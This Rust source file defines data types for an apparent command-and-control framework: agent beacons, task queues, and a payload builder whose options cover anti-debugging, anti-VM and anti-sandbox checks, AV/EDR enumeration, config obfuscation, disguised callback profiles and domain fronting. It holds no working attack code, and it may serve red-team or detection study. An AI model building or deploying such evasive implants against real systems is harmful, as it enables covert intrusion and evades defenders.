use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Default)]
pub struct AgentRegistration {
    pub agent_id: String,
    pub hostname: String,
    pub os: String,
    pub architecture: String,
    /// Process ID of the agent on the host (best-effort, 0 if unknown).
    #[serde(default)]
    pub pid: u32,
    /// Windows integrity label (Low/Medium/High/System) or "user"/"root" on POSIX.
    /// Empty when the agent could not determine it.
    #[serde(default)]
    pub integrity: String,
    /// True when the agent is running with elevated privileges.
    #[serde(default)]
    pub is_elevated: bool,
    /// Best-effort list of running AV/EDR product names. Empty when not enumerated.
    #[serde(default)]
    pub av_products: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BeaconRequest {
    pub registration: AgentRegistration,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BeaconReply {
    pub status: String,
    pub sleep_seconds: u64,
    pub task: Option<Task>,
    /// Number of noise bytes the agent should append to the next beacon body
    /// so the request size varies. 0 = no padding.
    #[serde(default)]
    pub request_padding_bytes: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Task {
    pub task_id: String,
    pub command: String,
    pub arguments: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct TaskRecord {
    pub agent_id: String,
    pub task: Task,
    pub status: TaskStatus,
    pub created_at_unix: u64,
    pub dispatched_at_unix: Option<u64>,
    pub completed_at_unix: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum TaskStatus {
    Queued,
    Dispatched,
    Completed,
    Failed,
    /// A dispatched task that the agent never replied to within the
    /// stale-dispatch window; reset to pending by the re-queue worker.
    ReQueued,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentResponse {
    pub agent_id: String,
    pub task_id: Option<String>,
    pub output: String,
    pub status: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentRecord {
    pub registration: AgentRegistration,
    pub first_seen_unix: u64,
    pub last_seen_unix: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum AgentStatus {
    Online,
    Stale,
    Offline,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentSummary {
    pub registration: AgentRegistration,
    pub first_seen_unix: u64,
    pub last_seen_unix: u64,
    pub status: AgentStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PayloadConfig {
    pub callback_url: String,
    pub sleep_seconds: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PayloadBuildRequest {
    pub callback_url: Option<String>,
    pub sleep_seconds: Option<u64>,
    pub jitter_percent: Option<u64>,
    pub agent_id: Option<String>,
    pub agent_token: Option<String>,
    /// PSK used for HMAC wire auth + wire body encryption. Optional override;
    /// when absent the teamserver's own agent_token (treated as PSK) is used.
    pub agent_psk: Option<String>,
    pub label: Option<String>,
    pub stealth: Option<bool>,
    pub anti_debug: Option<bool>,
    pub anti_vm: Option<bool>,
    pub anti_sandbox: Option<bool>,
    pub daemonize: Option<bool>,
    pub static_runtime: Option<bool>,
    pub xor_config: Option<bool>,
    pub xor_key: Option<u64>,
    pub target_os: Option<String>,
    pub format: Option<String>,
    pub kill_date_epoch: Option<u64>,
    pub ua_randomize: Option<bool>,
    pub sleep_obfuscate: Option<bool>,
    pub encrypt_payload: Option<bool>,
    /// When true, agent/server wire bodies are sealed with ChaCha20-Poly1305.
    #[serde(default)]
    pub wire_encryption: Option<bool>,
    /// Callback profile identifier (e.g. "default", "cdn_metrics", "analytics").
    /// See agent/src/profiles/.
    #[serde(default)]
    pub profile: Option<String>,
    /// SNI override for domain-front style deployments. When set, the agent
    /// opens the TLS handshake with this SNI while the HTTP Host header
    /// reflects the `callback_url` host.
    #[serde(default)]
    pub sni_override: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PayloadArtifact {
    pub build_id: String,
    pub label: Option<String>,
    pub binary_path: String,
    pub callback_url: String,
    pub sleep_seconds: u64,
    pub format: Option<String>,
    #[serde(default)]
    pub jitter_percent: u64,
    pub agent_id: Option<String>,
    pub agent_token_configured: bool,
    pub stealth: bool,
    #[serde(default)]
    pub anti_debug: bool,
    #[serde(default)]
    pub anti_vm: bool,
    #[serde(default)]
    pub anti_sandbox: bool,
    #[serde(default)]
    pub daemonize: bool,
    #[serde(default)]
    pub static_runtime: bool,
    #[serde(default)]
    pub xor_config: bool,
    #[serde(default)]
    pub xor_key: u64,
    #[serde(default = "default_payload_target_os")]
    pub target_os: String,
    pub run_args: Vec<String>,
    pub created_at_unix: u64,
    #[serde(default)]
    pub kill_date_epoch: u64,
    #[serde(default)]
    pub ua_randomize: bool,
    #[serde(default)]
    pub sleep_obfuscate: bool,
    #[serde(default)]
    pub encrypt_payload: bool,
    #[serde(default)]
    pub wire_encryption: bool,
    #[serde(default = "default_profile_name")]
    pub profile: String,
    #[serde(default)]
    pub sni_override: Option<String>,
}

fn default_payload_target_os() -> String {
    "linux".to_owned()
}

fn default_profile_name() -> String {
    "default".to_owned()
}

/// Wire envelope for B1. Carries the encrypted inner JSON payload plus a
/// 96-bit nonce and 128-bit Poly1305 tag. The decryption key is derived
/// from the agent/operator PSK via HKDF-SHA256.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct WireEnvelope {
    /// Random 12-byte nonce, base64 standard alphabet.
    pub nonce: String,
    /// ChaCha20 ciphertext, base64 standard alphabet.
    pub ct: String,
    /// Poly1305 tag (first 16 bytes), base64 standard alphabet.
    pub tag: String,
    /// Free-form context string used as HKDF info. Usually "beacon" or
    /// "response" so the same PSK produces different keys per direction.
    pub ctx: String,
}

/// Audit log entry written for every authenticated operator API call.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AuditEntry {
    pub id: i64,
    pub timestamp_unix: u64,
    pub source_ip: String,
    pub action: String,
    pub agent_id: Option<String>,
    pub task_id: Option<String>,
}